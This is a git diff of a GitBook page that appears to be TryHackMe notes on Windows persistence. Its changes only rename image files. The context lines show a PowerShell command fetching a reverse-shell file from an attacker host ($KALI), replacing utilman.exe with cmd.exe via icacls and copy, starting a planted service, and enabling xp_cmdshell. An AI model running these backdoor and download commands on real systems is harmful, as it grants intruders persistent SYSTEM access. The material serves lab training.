@@ -347,7 +347,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
@@ -793,7 +793,7 @@ You should now be able to press `SHIFT` five times to access a terminal with SYS
 
 Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (11).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -811,7 +811,7 @@ icacls C:\Windows\System32\utilman.exe /grant Administrator:F
 copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 To trigger our terminal, we will lock our screen from the start button.
 
@@ -874,7 +874,7 @@ To enable it, let's open `Microsoft SQL Server Management Studio 18`, available 
 
 Once logged in, click on the New Query button to open the query editor:
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>
 
 Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
 
